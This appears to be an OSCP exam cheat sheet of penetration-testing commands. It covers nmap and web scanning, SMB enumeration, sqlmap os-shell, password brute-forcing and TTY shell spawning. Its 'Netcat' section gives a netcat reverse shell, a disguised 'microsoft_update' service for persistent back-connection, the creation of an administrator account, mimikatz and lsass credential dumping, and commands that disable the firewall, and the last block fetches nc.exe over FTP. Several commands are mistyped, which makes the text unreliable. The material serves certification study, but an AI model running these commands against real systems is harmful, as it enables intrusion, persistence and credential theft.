OSCP(SPECIFICALLY OSCP) Process cheatsheets


Here are the commands that people who did the OSCP found helpful and its suggested to look at the resource links

Early stage:

Scanning:
Quick scan:
```
nmap <IP> --top-ports 10 --open
```

Intense Scan:
```
nmap -p 1-65535 -T4 -A -v <IP>
```

Web:
```
Nikto - h <IP>
dirb http://<IP> /user/share/wordlists
finmap -u <IP>./dotdotpwn.pl -m <MODULE> -h <HOST> [OPTIONS]
wpscan -url http://<IP>/ -enumerate p
```

SMB/RPC:
```
enum4linux -a <IP>
nmap -0-script=smb* -p <PORTS> <IP>
rpcclient <IP> -U "" -N
showmount -e <IP>/<PORT>
mount- t cifs //<IP><SHARE> <LOCAL DIRECTORY> -o username="guest", password""
net view \\<IP>
nbtscan -r<IP>
smbclient - L \\ <IP> -U "" -N
rlogin <IP> 
nmlookup -A target
```

SQL:
SQL injection cheatsheet(http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
```
nmap -sV -Pn -vv -script=mysql* <IP> -p <PORT>
sqlmap -u <IP> -crawl=1
sqlmap -u http://<IP>/page.php?commen=761 - DBMS=mysql -os-shell
```


SMTP:
nmap -script=smtp* -p <PORT> <IP>

SNMP:
```
snmpwalk -c public -v1 <IP>
snmpenum -t <IP>
Onesixtyones -c <COMMUNITY FILE> -I <IP>
```

FTP:
```
nmap -script=ftp* -p <PORT> <IP>
```

DNS:
```
./dnsrecon.py -d <DOMAIN>
./dnsrecon.py -d <DOMAIN> -t axfr
./dnsrecon.py -d <DOMAIN> -D <NAME LIST> -t brt
./dnsrecon.py -d <HOST> -t zonewalk
nmap -script=dns-zone-transfer -p 53 ns2.megacorpone.com
nmap <IP> -p- -sV --reason --dns-server 1.2.3.4
```

Pass the hash:
```
pth-winexe -U <HAASH> //<IP> cmd
```


---
In action:

Password cracking:
Discover type of hash that you have 
```
hash-identifier 
```

hydra:
```
Hydra -L <USER FILE> -P <PASS FILE> -M http -m DIR:/admin -T 30
```

Medusa:
```
Medusa -h <IP> -U <USER PROFILE> -P <PASS FILE> -M http -m DIR:/admin -T 30
```

Hashcat:
```
hashcat -m 400 -a 0 <HASHFILE> <WORDLIST>
```


TTY shells:
Below are some helpful tricks to spawn a TTY shell in the event you need to further interact with the system. These are also helpful in breaking out of “jail shells”.

```
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
When in vi:!bash (or) :set shell=/bin/bash:shell
When in nmap: !sh
```

Netcat:
```
net view
net user
net local group Users net localgroup administrators
net user hacker password1 /add
net localgroup administrators hacker /add
search dir/s *.doc
system("start cmd.exe /$cmd")
sc create microsoft_update binpath="cmd/L start c:/nc.exe -d <IP> <PORT> -e cmd.exe" start= auto error=ignore
C:\nc.exe -e c:\windows\system\cmd.exe -vv <IP> <PORT>
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
(32-bit)
(64-bit)
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
netsh firewall set opmode disable
%YSYSTEMDRIVE%\boot.ini
%WINDRIVE%\win.ini
type %WINDRIVE%\System32\drivers\etc\hosts
```


Useful Nix commands:
```
SUID root files: find / -user root -perm -4000 -print
SGID root files: find / -group root -perm -2000 -print 
SUID & SGID root files ownership: find / -perm -4000 -print -o -perm -2000 -print
Files not owned by anyone: find / -nouser -print
Files not owned by any group find / -nogroup -print
Symlinks and their pointers find / -type l -ls
```



Download an EXE from FTP server
```
echo open IP> C:\script.txt
echo user mftpuser>> C:\script.txt
echo pass myftppass>> C:\script.txt
echo get nc.exe>> C:\script.txt
echo bye>> C:\script.txt
ftp -s:script.txt
```
